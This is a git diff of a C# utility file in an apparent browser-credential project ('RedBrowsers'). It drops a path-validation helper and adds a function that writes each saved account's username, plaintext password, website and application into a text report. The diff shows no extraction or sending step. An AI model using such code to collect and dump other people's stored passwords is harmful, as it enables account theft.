@@ -1,4 +1,5 @@
-﻿using System;
+﻿using RedBrowsers.Classes;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -42,30 +43,14 @@ namespace RedBrowsers.Utlis
                 CreateRows(list, sw);
             }
         }
-        public static bool IsValidPath(string path, bool allowRelativePaths = false)
+        public static string CreateString(List<Account> a) 
         {
-            bool isValid = true;
-
-            try
+            string ret =string.Empty;
+            foreach (Account account in a)
             {
-                string fullPath = Path.GetFullPath(path);
-
-                if (allowRelativePaths)
-                {
-                    isValid = Path.IsPathRooted(path);
-                }
-                else
-                {
-                    string root = Path.GetPathRoot(path);
-                    isValid = string.IsNullOrEmpty(root.Trim(new char[] { '\\', '/' })) == false;
-                }
+                ret += $"---------------------------------------------{Environment.NewLine}UserName    =  {account.UserName}{Environment.NewLine}PassWord    =  {account.Password}{Environment.NewLine}Website     =  {account.URL}{Environment.NewLine}Application =  {account.Application}{Environment.NewLine}---------------------------------------------";
             }
-            catch (Exception ex)
-            {
-                isValid = false;
-            }
-
-            return isValid;
+            return ret;
         }
     }
 }
